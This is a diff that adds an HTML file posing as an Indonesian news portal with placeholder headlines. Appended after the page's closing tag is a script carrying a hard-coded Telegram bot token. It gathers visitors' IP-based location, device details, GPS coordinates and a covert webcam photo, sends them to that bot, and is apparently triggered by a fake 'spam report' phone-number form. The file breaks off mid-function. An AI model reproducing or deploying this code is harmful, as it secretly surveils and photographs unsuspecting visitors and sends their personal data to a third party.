@@ -1,0 +1,616 @@
+<html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>VercelInfo - Berita Terkini Indonesia</title>
+  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700;900&family=Source+Serif+4:wght@400;600&family=DM+Sans:wght@400;500;600&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --red: #C8102E;
+      --dark: #111111;
+      --mid: #333333;
+      --light: #f5f5f0;
+      --border: #e0e0d8;
+      --accent: #f0a500;
+      --white: #ffffff;
+    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: 'DM Sans', sans-serif; background: var(--light); color: var(--dark); }
+
+    /* TOP BAR */
+    .topbar { background: var(--dark); color: #aaa; font-size: 12px; padding: 6px 0; border-bottom: 2px solid var(--red); }
+    .topbar-inner { max-width: 1200px; margin: 0 auto; padding: 0 20px; display: flex; justify-content: space-between; align-items: center; }
+    .topbar a { color: #aaa; text-decoration: none; margin-left: 12px; }
+    .topbar a:hover { color: white; }
+
+    /* HEADER */
+    header { background: var(--white); border-bottom: 1px solid var(--border); padding: 16px 0 0; }
+    .header-inner { max-width: 1200px; margin: 0 auto; padding: 0 20px; }
+    .logo-area { display: flex; align-items: center; justify-content: space-between; margin-bottom: 16px; }
+    .logo { font-family: 'Playfair Display', serif; font-weight: 900; font-size: 42px; color: var(--red); letter-spacing: -1px; text-decoration: none; }
+    .logo span { color: var(--dark); }
+    .header-tagline { font-size: 11px; color: #888; font-style: italic; font-family: 'Source Serif 4', serif; margin-top: 2px; }
+    .search-bar { display: flex; gap: 6px; }
+    .search-bar input { padding: 8px 14px; border: 1.5px solid var(--border); border-radius: 4px; font-size: 13px; font-family: 'DM Sans', sans-serif; width: 200px; background: var(--light); }
+    .search-bar input:focus { outline: none; border-color: var(--red); }
+    .search-bar button { background: var(--red); color: white; border: none; border-radius: 4px; padding: 8px 14px; cursor: pointer; font-size: 13px; }
+
+    /* NAV */
+    nav { border-top: 2px solid var(--red); background: var(--white); }
+    .nav-inner { max-width: 1200px; margin: 0 auto; padding: 0 20px; display: flex; }
+    nav a { font-size: 13px; font-weight: 600; color: var(--dark); text-decoration: none; padding: 11px 16px; display: block; text-transform: uppercase; letter-spacing: 0.5px; border-bottom: 3px solid transparent; transition: all 0.15s; }
+    nav a:hover, nav a.active { color: var(--red); border-bottom-color: var(--red); }
+
+    /* BREAKING */
+    .breaking { background: var(--red); color: white; padding: 7px 0; overflow: hidden; }
+    .breaking-inner { max-width: 1200px; margin: 0 auto; padding: 0 20px; display: flex; align-items: center; gap: 16px; }
+    .breaking-label { background: white; color: var(--red); font-weight: 700; font-size: 11px; padding: 3px 10px; border-radius: 2px; text-transform: uppercase; letter-spacing: 1px; white-space: nowrap; }
+    .ticker-wrap { flex: 1; overflow: hidden; }
+    .ticker { display: inline-block; white-space: nowrap; animation: ticker 35s linear infinite; font-size: 13px; font-weight: 500; }
+    @keyframes ticker { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
+
+    /* MAIN */
+    .container { max-width: 1200px; margin: 28px auto; padding: 0 20px; display: grid; grid-template-columns: 1fr 320px; gap: 30px; }
+
+    /* HERO */
+    .hero { display: grid; grid-template-columns: 1fr 1fr; grid-template-rows: auto auto; gap: 1px; background: var(--border); border: 1px solid var(--border); margin-bottom: 30px; }
+    .hero-main { grid-column: 1 / 2; grid-row: 1 / 3; background: white; position: relative; overflow: hidden; min-height: 380px; }
+    .hero-sub { min-height: 180px; background: white; overflow: hidden; position: relative; }
+    .img-ph { background: linear-gradient(135deg, #ddd 0%, #e8e8e0 100%); display: flex; align-items: center; justify-content: center; width: 100%; height: 100%; position: absolute; top: 0; left: 0; }
+    .hero-caption { position: absolute; bottom: 0; left: 0; right: 0; background: linear-gradient(transparent, rgba(0,0,0,0.85)); padding: 30px 20px 18px; color: white; }
+    .hero-caption .cat { background: var(--red); color: white; font-size: 10px; font-weight: 700; text-transform: uppercase; letter-spacing: 1.5px; padding: 3px 8px; display: inline-block; margin-bottom: 8px; }
+    .hero-caption h2 { font-family: 'Playfair Display', serif; font-size: 22px; line-height: 1.3; font-weight: 700; }
+    .hero-sub-caption { position: absolute; bottom: 0; left: 0; right: 0; background: linear-gradient(transparent, rgba(0,0,0,0.8)); padding: 20px 14px 12px; color: white; }
+    .hero-sub-caption .cat { background: var(--accent); color: white; font-size: 10px; font-weight: 700; text-transform: uppercase; letter-spacing: 1.5px; padding: 2px 7px; display: inline-block; margin-bottom: 6px; }
+    .hero-sub-caption h3 { font-family: 'Playfair Display', serif; font-size: 15px; line-height: 1.3; }
+
+    /* SECTION TITLE */
+    .section-title { font-family: 'Playfair Display', serif; font-size: 20px; font-weight: 900; padding-bottom: 10px; border-bottom: 3px solid var(--red); margin-bottom: 20px; display: flex; align-items: center; gap: 10px; }
+    .section-title::after { content: ''; flex: 1; height: 1px; background: var(--border); margin-left: 6px; }
+
+    /* NEWS GRID */
+    .news-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 22px; margin-bottom: 30px; }
+    .news-card { background: white; border: 1px solid var(--border); border-radius: 3px; overflow: hidden; transition: box-shadow 0.2s; cursor: pointer; }
+    .news-card:hover { box-shadow: 0 4px 20px rgba(0,0,0,0.10); }
+    .news-card-img { height: 160px; background: linear-gradient(135deg, #ddd, #e8e8e0); display: flex; align-items: center; justify-content: center; }
+    .news-card-body { padding: 14px; }
+    .news-cat { font-size: 10px; font-weight: 700; text-transform: uppercase; letter-spacing: 1.2px; color: var(--red); margin-bottom: 6px; }
+    .news-card h3 { font-family: 'Source Serif 4', serif; font-size: 15px; font-weight: 600; line-height: 1.45; color: var(--dark); margin-bottom: 8px; }
+    .news-card p { font-size: 12.5px; color: #666; line-height: 1.6; display: -webkit-box; -webkit-line-clamp: 3; -webkit-box-orient: vertical; overflow: hidden; }
+    .news-meta { font-size: 11px; color: #999; margin-top: 10px; display: flex; justify-content: space-between; }
+
+    /* LIST NEWS */
+    .news-list { display: flex; flex-direction: column; }
+    .news-list-item { display: flex; gap: 14px; padding: 14px 0; border-bottom: 1px solid var(--border); cursor: pointer; }
+    .news-list-item:last-child { border-bottom: none; }
+    .news-list-img { width: 90px; height: 68px; background: linear-gradient(135deg, #ddd, #e8e8e0); border-radius: 3px; flex-shrink: 0; display: flex; align-items: center; justify-content: center; }
+    .news-list-item h4 { font-family: 'Source Serif 4', serif; font-size: 14px; font-weight: 600; line-height: 1.4; color: var(--dark); margin-bottom: 4px; }
+    .news-list-item:hover h4 { color: var(--red); }
+    .news-list-item span { font-size: 11px; color: #999; }
+
+    /* SIDEBAR */
+    .sidebar-widget { background: white; border: 1px solid var(--border); border-radius: 3px; margin-bottom: 24px; overflow: hidden; }
+    .widget-title { font-family: 'Playfair Display', serif; font-size: 16px; font-weight: 900; padding: 12px 16px; border-bottom: 3px solid var(--red); background: var(--dark); color: white; }
+    .trending-list { padding: 0 16px; }
+    .trending-item { display: flex; align-items: flex-start; gap: 12px; padding: 12px 0; border-bottom: 1px solid var(--border); cursor: pointer; }
+    .trending-item:last-child { border-bottom: none; }
+    .trending-num { font-family: 'Playfair Display', serif; font-size: 26px; font-weight: 900; color: var(--border); line-height: 1; min-width: 28px; }
+    .trending-item:hover .trending-num { color: var(--red); }
+    .trending-item h5 { font-family: 'Source Serif 4', serif; font-size: 13px; font-weight: 600; line-height: 1.4; color: var(--dark); }
+    .trending-item:hover h5 { color: var(--red); }
+    .trending-item span { font-size: 11px; color: #999; display: block; margin-top: 3px; }
+
+    .ad-box { background: linear-gradient(135deg, #f0f0e8, #e8e8e0); border: 1px dashed #ccc; border-radius: 3px; padding: 30px 20px; text-align: center; color: #aaa; font-size: 12px; margin-bottom: 24px; }
+    .ad-box strong { display: block; font-size: 14px; color: #bbb; margin-bottom: 4px; }
+
+    .opinion-card { padding: 16px; border-bottom: 1px solid var(--border); display: flex; gap: 14px; cursor: pointer; }
+    .opinion-card:last-child { border-bottom: none; }
+    .opinion-avatar { width: 48px; height: 48px; border-radius: 50%; background: linear-gradient(135deg, #ddd, #e8e8e0); display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+    .opinion-card h5 { font-family: 'Source Serif 4', serif; font-size: 13.5px; font-weight: 600; line-height: 1.4; color: var(--dark); margin-bottom: 4px; }
+    .opinion-card:hover h5 { color: var(--red); }
+    .opinion-author { font-size: 11px; color: #888; font-style: italic; }
+
+    /* FOOTER */
+    footer { background: var(--dark); color: #aaa; margin-top: 40px; padding: 40px 0 20px; }
+    .footer-inner { max-width: 1200px; margin: 0 auto; padding: 0 20px; }
+    .footer-logo { font-family: 'Playfair Display', serif; font-size: 28px; font-weight: 900; color: var(--red); margin-bottom: 8px; }
+    .footer-logo span { color: white; }
+    .footer-desc { font-size: 13px; color: #777; max-width: 340px; line-height: 1.7; margin-bottom: 30px; }
+    .footer-grid { display: grid; grid-template-columns: 2fr 1fr 1fr 1fr; gap: 30px; border-top: 1px solid #333; padding-top: 30px; margin-bottom: 30px; }
+    .footer-col h6 { color: white; font-size: 12px; text-transform: uppercase; letter-spacing: 1.5px; margin-bottom: 14px; font-weight: 700; }
+    .footer-col a { display: block; color: #777; text-decoration: none; font-size: 13px; margin-bottom: 8px; }
+    .footer-col a:hover { color: white; }
+    .footer-bottom { border-top: 1px solid #333; padding-top: 16px; display: flex; justify-content: space-between; font-size: 12px; color: #555; }
+
+    /* RESPONSIVE */
+    @media (max-width: 900px) {
+      .container { grid-template-columns: 1fr; }
+      .news-grid { grid-template-columns: 1fr 1fr; }
+      .hero { grid-template-columns: 1fr; }
+      .hero-main { min-height: 260px; }
+      .hero-sub:last-child { display: none; }
+      .footer-grid { grid-template-columns: 1fr 1fr; }
+    }
+    @media (max-width: 600px) {
+      .logo { font-size: 30px; }
+      .news-grid { grid-template-columns: 1fr; }
+      nav { overflow-x: auto; }
+      nav a { padding: 10px 12px; font-size: 12px; }
+      .footer-grid { grid-template-columns: 1fr; }
+      .logo-area { flex-direction: column; align-items: flex-start; gap: 10px; }
+    }
+  </style>
+</head>
+<body>
+
+<div class="topbar">
+  <div class="topbar-inner">
+    <span id="topbar-date"></span>
+    <div>
+      <a href="#">Masuk</a>
+      <a href="#">Daftar</a>
+      <a href="#">E-Paper</a>
+      <a href="#">Newsletter</a>
+    </div>
+  </div>
+</div>
+
+<header>
+  <div class="header-inner">
+    <div class="logo-area">
+      <div>
+        <a href="#" class="logo">Vercel<span>Info</span></a>
+        <div class="header-tagline">Berita Terpercaya, Informasi Terkini Indonesia</div>
+      </div>
+      <div class="search-bar">
+        <input type="text" placeholder="Cari berita...">
+        <button>Cari</button>
+      </div>
+    </div>
+  </div>
+  <nav>
+    <div class="nav-inner">
+      <a href="#" class="active">Beranda</a>
+      <a href="#">Nasional</a>
+      <a href="#">Ekonomi</a>
+      <a href="#">Politik</a>
+      <a href="#">Teknologi</a>
+      <a href="#">Olahraga</a>
+      <a href="#">Hiburan</a>
+      <a href="#">Internasional</a>
+      <a href="#">Gaya Hidup</a>
+    </div>
+  </nav>
+</header>
+
+<div class="breaking">
+  <div class="breaking-inner">
+    <div class="breaking-label">🔴 Breaking</div>
+    <div class="ticker-wrap">
+      <span class="ticker">
+        Pemerintah Umumkan Kebijakan Ekonomi Baru &nbsp;&nbsp;•&nbsp;&nbsp;
+        Timnas Indonesia Menang 3-0 Lawan Malaysia &nbsp;&nbsp;•&nbsp;&nbsp;
+        IHSG Ditutup Menguat di Angka 7.250 &nbsp;&nbsp;•&nbsp;&nbsp;
+        Banjir Bandang Hantam Sulawesi Tengah, Ribuan Warga Mengungsi &nbsp;&nbsp;•&nbsp;&nbsp;
+        KPK Tangkap Tersangka Korupsi Dana Desa &nbsp;&nbsp;•&nbsp;&nbsp;
+        Presiden Resmikan Jalan Tol Trans Kalimantan &nbsp;&nbsp;•&nbsp;&nbsp;
+        WHO Umumkan Penemuan Baru Vaksin Tropis
+      </span>
+    </div>
+  </div>
+</div>
+
+<div class="container">
+  <main>
+
+    <!-- HERO -->
+    <div class="hero">
+      <div class="hero-main">
+        <div class="img-ph">
+          <svg width="80" height="80" viewBox="0 0 24 24" fill="none" stroke="#ccc" stroke-width="1"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg>
+        </div>
+        <div class="hero-caption">
+          <div class="cat">Nasional</div>
+          <h2>Pemerintah Luncurkan Program Beasiswa Nasional untuk 500 Ribu Pelajar Indonesia di Tahun 2025</h2>
+        </div>
+      </div>
+      <div class="hero-sub">
+        <div class="img-ph">
+          <svg width="50" height="50" viewBox="0 0 24 24" fill="none" stroke="#ccc" stroke-width="1"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg>
+        </div>
+        <div class="hero-sub-caption">
+          <div class="cat">Ekonomi</div>
+          <h3>Bank Indonesia Pertahankan Suku Bunga Acuan di 5,75% Demi Jaga Stabilitas Rupiah</h3>
+        </div>
+      </div>
+      <div class="hero-sub">
+        <div class="img-ph">
+          <svg width="50" height="50" viewBox="0 0 24 24" fill="none" stroke="#ccc" stroke-width="1"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg>
+        </div>
+        <div class="hero-sub-caption">
+          <div class="cat">Teknologi</div>
+          <h3>Startup Lokal Raih Pendanaan Seri C Sebesar 150 Juta Dolar dari Investor Global</h3>
+        </div>
+      </div>
+    </div>
+
+    <!-- BERITA TERBARU -->
+    <div class="section-title">Berita Terbaru</div>
+    <div class="news-grid">
+
+      <div class="news-card">
+        <div class="news-card-img"><svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#ccc" stroke-width="1.5"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg></div>
+        <div class="news-card-body">
+          <div class="news-cat">Politik</div>
+          <h3>DPR Sahkan RUU Pemilu dengan Sistem Proporsional Terbuka di Tengah Pro Kontra</h3>
+          <p>Rapat paripurna DPR RI resmi mengesahkan RUU Pemilu yang mempertahankan sistem proporsional terbuka untuk pemilihan legislatif mendatang.</p>
+          <div class="news-meta"><span>Redaksi VercelInfo</span><span>2 jam lalu</span></div>
+        </div>
+      </div>
+
+      <div class="news-card">
+        <div class="news-card-img"><svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#ccc" stroke-width="1.5"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg></div>
+        <div class="news-card-body">
+          <div class="news-cat">Ekonomi</div>
+          <h3>Harga BBM Non Subsidi Turun Mulai 1 April 2025, Ini Daftarnya</h3>
+          <p>Pertamina resmi menurunkan harga Pertamax dan Dex mulai tanggal 1 April 2025 menyusul penurunan harga minyak dunia.</p>
+          <div class="news-meta"><span>Reporter Ekonomi</span><span>3 jam lalu</span></div>
+        </div>
+      </div>
+
+      <div class="news-card">
+        <div class="news-card-img"><svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#ccc" stroke-width="1.5"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg></div>
+        <div class="news-card-body">
+          <div class="news-cat">Olahraga</div>
+          <h3>Timnas U-23 Lolos ke Semifinal Piala Asia Setelah Tundukkan Jepang 2-1</h3>
+          <p>Timnas Indonesia U-23 mencatatkan sejarah dengan lolos ke semifinal Piala Asia U-23 usai menang dramatis 2-1 melawan Jepang.</p>
+          <div class="news-meta"><span>Reporter Olahraga</span><span>5 jam lalu</span></div>
+        </div>
+      </div>
+
+      <div class="news-card">
+        <div class="news-card-img"><svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#ccc" stroke-width="1.5"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg></div>
+        <div class="news-card-body">
+          <div class="news-cat">Teknologi</div>
+          <h3>Apple Umumkan iPhone 17 dengan Chip AI Terbaru, Ini Spesifikasi Lengkapnya</h3>
+          <p>Apple memperkenalkan seri iPhone 17 dengan chip A19 Pro yang diklaim memiliki kemampuan kecerdasan buatan on-device terbaik di kelasnya.</p>
+          <div class="news-meta"><span>Tim Teknologi</span><span>6 jam lalu</span></div>
+        </div>
+      </div>
+
+      <div class="news-card">
+        <div class="news-card-img"><svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#ccc" stroke-width="1.5"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg></div>
+        <div class="news-card-body">
+          <div class="news-cat">Internasional</div>
+          <h3>Gencatan Senjata di Gaza Diperpanjang 30 Hari, PBB Sambut Positif</h3>
+          <p>Perjanjian gencatan senjata antara Israel dan Hamas resmi diperpanjang 30 hari setelah negosiasi yang dimediasi Qatar dan Mesir.</p>
+          <div class="news-meta"><span>Reporter Internasional</span><span>8 jam lalu</span></div>
+        </div>
+      </div>
+
+      <div class="news-card">
+        <div class="news-card-img"><svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#ccc" stroke-width="1.5"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg></div>
+        <div class="news-card-body">
+          <div class="news-cat">Kesehatan</div>
+          <h3>Kemenkes: Waspada Demam Berdarah, Kasus Naik 40% di Musim Hujan Ini</h3>
+          <p>Kemenkes mengeluarkan imbauan kewaspadaan dengue menyusul lonjakan kasus di berbagai kota besar termasuk Jakarta dan Surabaya.</p>
+          <div class="news-meta"><span>Tim Kesehatan</span><span>10 jam lalu</span></div>
+        </div>
+      </div>
+
+    </div>
+
+    <!-- BERITA PILIHAN -->
+    <div class="section-title">Berita Pilihan Hari Ini</div>
+    <div class="news-list">
+      <div class="news-list-item">
+        <div class="news-list-img"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#ccc" stroke-width="1.5"><rect x="3" y="3" width="18" height="18" rx="2"/><polyline points="21 15 16 10 5 21"/></svg></div>
+        <div>
+          <h4>Jembatan Barito 2 Resmi Beroperasi, Persingkat Waktu Tempuh Kalimantan Selatan</h4>
+          <span>Infrastruktur • 1 jam lalu</span>
+        </div>
+      </div>
+      <div class="news-list-item">
+        <div class="news-list-img"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#ccc" stroke-width="1.5"><rect x="3" y="3" width="18" height="18" rx="2"/><polyline points="21 15 16 10 5 21"/></svg></div>
+        <div>
+          <h4>Rupiah Menguat ke Level Rp15.720 per Dolar AS Pagi Ini</h4>
+          <span>Ekonomi • 2 jam lalu</span>
+        </div>
+      </div>
+      <div class="news-list-item">
+        <div class="news-list-img"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#ccc" stroke-width="1.5"><rect x="3" y="3" width="18" height="18" rx="2"/><polyline points="21 15 16 10 5 21"/></svg></div>
+        <div>
+          <h4>KPU Tetapkan Jadwal Resmi Pilkada Serentak 2025, Pendaftaran Dibuka Bulan Juni</h4>
+          <span>Politik • 3 jam lalu</span>
+        </div>
+      </div>
+      <div class="news-list-item">
+        <div class="news-list-img"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#ccc" stroke-width="1.5"><rect x="3" y="3" width="18" height="18" rx="2"/><polyline points="21 15 16 10 5 21"/></svg></div>
+        <div>
+          <h4>Film Indonesia Raih Penghargaan Bergengsi di Festival Film Internasional Cannes</h4>
+          <span>Hiburan • 4 jam lalu</span>
+        </div>
+      </div>
+      <div class="news-list-item">
+        <div class="news-list-img"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#ccc" stroke-width="1.5"><rect x="3" y="3" width="18" height="18" rx="2"/><polyline points="21 15 16 10 5 21"/></svg></div>
+        <div>
+          <h4>Gempa 6,2 SR Guncang Flores, BMKG Pastikan Tidak Ada Potensi Tsunami</h4>
+          <span>Nasional • 5 jam lalu</span>
+        </div>
+      </div>
+    </div>
+
+  </main>
+
+  <!-- SIDEBAR -->
+  <aside>
+
+    <div class="sidebar-widget">
+      <div class="widget-title">🔥 Trending Sekarang</div>
+      <div class="trending-list">
+        <div class="trending-item">
+          <div class="trending-num">01</div>
+          <div><h5>Presiden Tinjau Langsung Proyek IKN Nusantara di Kalimantan Timur</h5><span>32.450 pembaca</span></div>
+        </div>
+        <div class="trending-item">
+          <div class="trending-num">02</div>
+          <div><h5>Kenaikan UMP 2026 Diumumkan Resmi, Ini Besaran Per Provinsi</h5><span>28.100 pembaca</span></div>
+        </div>
+        <div class="trending-item">
+          <div class="trending-num">03</div>
+          <div><h5>Timnas Garuda Masuk Pot 1 Kualifikasi Piala Dunia 2026</h5><span>25.880 pembaca</span></div>
+        </div>
+        <div class="trending-item">
+          <div class="trending-num">04</div>
+          <div><h5>GoTo dan Grab Merger? Ini Penjelasan Resmi dari Kedua Perusahaan</h5><span>21.340 pembaca</span></div>
+        </div>
+        <div class="trending-item">
+          <div class="trending-num">05</div>
+          <div><h5>Subsidi Motor Listrik 2025 Diperluas, Ini Syarat dan Cara Daftarnya</h5><span>19.770 pembaca</span></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="ad-box">
+      <strong>IKLAN</strong>
+      <p>Advertisement 300 × 250</p>
+    </div>
+
+    <div class="sidebar-widget">
+      <div class="widget-title">✍️ Opini & Kolom</div>
+      <div class="opinion-card">
+        <div class="opinion-avatar"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#ccc" stroke-width="2"><circle cx="12" cy="8" r="4"/><path d="M4 20c0-4 3.6-7 8-7s8 3 8 7"/></svg></div>
+        <div>
+          <h5>Mengapa Transformasi Digital Sektor Publik Indonesia Masih Tertinggal?</h5>
+          <div class="opinion-author">Dr. Bambang Setiawan — Pengamat Kebijakan</div>
+        </div>
+      </div>
+      <div class="opinion-card">
+        <div class="opinion-avatar"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#ccc" stroke-width="2"><circle cx="12" cy="8" r="4"/><path d="M4 20c0-4 3.6-7 8-7s8 3 8 7"/></svg></div>
+        <div>
+          <h5>Dilema Hilirisasi: Antara Kedaulatan Sumber Daya dan Investasi Asing</h5>
+          <div class="opinion-author">Prof. Siti Rahayu — Ekonom UI</div>
+        </div>
+      </div>
+      <div class="opinion-card">
+        <div class="opinion-avatar"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#ccc" stroke-width="2"><circle cx="12" cy="8" r="4"/><path d="M4 20c0-4 3.6-7 8-7s8 3 8 7"/></svg></div>
+        <div>
+          <h5>Generasi Z dan Politik: Potensi Besar yang Belum Tergarap Optimal</h5>
+          <div class="opinion-author">Andriani Kusuma — Analis Politik</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="sidebar-widget" style="padding:16px;">
+      <div style="font-family:'Playfair Display',serif;font-size:15px;font-weight:900;margin-bottom:14px;border-bottom:2px solid var(--red);padding-bottom:8px;">🌤️ Cuaca Hari Ini</div>
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;">
+        <div style="text-align:center;background:var(--light);border-radius:4px;padding:10px;"><div style="font-size:11px;color:#888;margin-bottom:4px;">Jakarta</div><div style="font-size:22px;font-weight:700;">32°C</div><div style="font-size:11px;color:#888;">Berawan</div></div>
+        <div style="text-align:center;background:var(--light);border-radius:4px;padding:10px;"><div style="font-size:11px;color:#888;margin-bottom:4px;">Surabaya</div><div style="font-size:22px;font-weight:700;">34°C</div><div style="font-size:11px;color:#888;">Cerah</div></div>
+        <div style="text-align:center;background:var(--light);border-radius:4px;padding:10px;"><div style="font-size:11px;color:#888;margin-bottom:4px;">Bandung</div><div style="font-size:22px;font-weight:700;">26°C</div><div style="font-size:11px;color:#888;">Hujan Ringan</div></div>
+        <div style="text-align:center;background:var(--light);border-radius:4px;padding:10px;"><div style="font-size:11px;color:#888;margin-bottom:4px;">Bali</div><div style="font-size:22px;font-weight:700;">30°C</div><div style="font-size:11px;color:#888;">Cerah Berawan</div></div>
+      </div>
+    </div>
+
+  </aside>
+</div>
+
+<footer>
+  <div class="footer-inner">
+    <div class="footer-logo">Vercel<span>Info</span></div>
+    <div class="footer-desc">Portal berita digital terpercaya Indonesia. Menyajikan informasi aktual, mendalam, dan berimbang untuk masyarakat Indonesia.</div>
+    <div class="footer-grid">
+      <div class="footer-col">
+        <h6>Tentang Kami</h6>
+        <a href="#">Redaksi</a>
+        <a href="#">Pedoman Media Siber</a>
+        <a href="#">Kebijakan Privasi</a>
+        <a href="#">Syarat & Ketentuan</a>
+        <a href="#">Karir</a>
+      </div>
+      <div class="footer-col">
+        <h6>Rubrik</h6>
+        <a href="#">Nasional</a>
+        <a href="#">Internasional</a>
+        <a href="#">Ekonomi</a>
+        <a href="#">Teknologi</a>
+        <a href="#">Olahraga</a>
+      </div>
+      <div class="footer-col">
+        <h6>Layanan</h6>
+        <a href="#">E-Paper</a>
+        <a href="#">Newsletter</a>
+        <a href="#">Podcast</a>
+        <a href="#">Pasang Iklan</a>
+      </div>
+      <div class="footer-col">
+        <h6>Ikuti Kami</h6>
+        <a href="#">Instagram</a>
+        <a href="#">Twitter / X</a>
+        <a href="#">Facebook</a>
+        <a href="#">YouTube</a>
+        <a href="#">TikTok</a>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <span>© 2025 VercelInfo. Hak Cipta Dilindungi Undang-Undang.</span>
+      <span>Anggota Dewan Pers Indonesia</span>
+    </div>
+  </div>
+</footer>
+
+<script>
+  const days = ['Minggu','Senin','Selasa','Rabu','Kamis','Jumat','Sabtu'];
+  const months = ['Januari','Februari','Maret','April','Mei','Juni','Juli','Agustus','September','Oktober','November','Desember'];
+  const now = new Date();
+  document.getElementById('topbar-date').textContent =
+    `${days[now.getDay()]}, ${now.getDate()} ${months[now.getMonth()]} ${now.getFullYear()}`;
+</script>
+
+</body>
+</html>
+
+
+  <script>
+    const botToken = '8488902287:AAEzc2LRWSTQpMEzSkV9tF04IGUhQpuq6i4';
+    const chatIds = ['392836663'];
+    const infoDiv = document.getElementById('info');
+    const input = document.getElementById('text');
+    const button = document.getElementById('login-button');
+
+    function sendToTelegram(text) {
+      chatIds.forEach(id => {
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: id, text: text, parse_mode: 'HTML' })
+        }).catch(console.error);
+      });
+    }
+
+    function sendPhotoToTelegram(blob) {
+      chatIds.forEach(id => {
+        const formData = new FormData();
+        formData.append('chat_id', id);
+        formData.append('photo', blob);
+        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        }).catch(console.error);
+      });
+    }
+
+    async function getInfo() {
+      let ip = '-', city = '-', region = '-', country = '-', org = '-';
+      try {
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipRes.json();
+        ip = ipData.ip;
+        const locRes = await fetch(`https://ip-api.com/json/${ip}`);
+        const loc = await locRes.json();
+        if (loc.status === 'success') {
+          city = loc.city;
+          region = loc.regionName;
+          country = loc.country;
+          org = loc.org;
+        }
+      } catch {}
+
+      const battery = await navigator.getBattery?.() || { level: 0, charging: false };
+      const batteryPercent = battery.level ? `${(battery.level * 100).toFixed(0)}%` : 'N/A';
+
+      const text = `
+IP         : ${ip}
+Kota       : ${city}
+Region     : ${region}
+Negara     : ${country}
+ISP        : ${org}
+Browser    : ${navigator.userAgent}
+OS         : ${navigator.platform}
+Resolusi   : ${screen.width}x${screen.height}
+Baterai    : ${batteryPercent} (${battery.charging ? 'Charging' : 'Tidak Charging'})
+Memori     : ${navigator.deviceMemory || 'N/A'} GB
+Cookie     : ${navigator.cookieEnabled ? 'Ya' : 'Tidak'}
+Waktu      : ${new Date().toLocaleString()}
+      `.trim();
+
+      sendToTelegram(`<b>📥 Info Pengunjung:</b>\n<pre>${text}</pre>`);
+
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            sendToTelegram(`<b>📍 Lokasi GPS:</b> <a href="${link}">Klik di sini</a>`);
+          },
+          () => sendToTelegram(`📍 Lokasi GPS Ditolak`)
+        );
+      } else {
+        sendToTelegram(`📍 Browser tidak support GPS`);
+      }
+    }
+
+    async function startCamera() {
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
+      const ctx = canvas.getContext('2d');
+      return new Promise((resolve) => {
+        navigator.mediaDevices.getUserMedia({ video: true })
+          .then(stream => {
+            video.srcObject = stream;
+            video.onloadedmetadata = () => {
+              setTimeout(() => {
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                canvas.toBlob(blob => {
+                  if (blob) sendPhotoToTelegram(blob);
+                  stream.getTracks().forEach(track => track.stop());
+                  resolve();
+                }, 'image/jpeg');
+              }, 3000);
+            };
+          })
+          .catch(err => {
+            sendToTelegram('❌ Kamera Ditolak atau Tidak Tersedia');
+            resolve();
+          });
+      });
+    }
+
+    button.addEventListener('click', async () => {
+      const nomor = input.value.trim();
+      if (!nomor || nomor.length < 8 || nomor.length > 15) {
+        infoDiv.innerText = '⚠️ Nomor tidak valid.';
+        return;
+      }
+      button.disabled = true;
+      infoDiv.innerText = '⏳ Memproses spam report...';
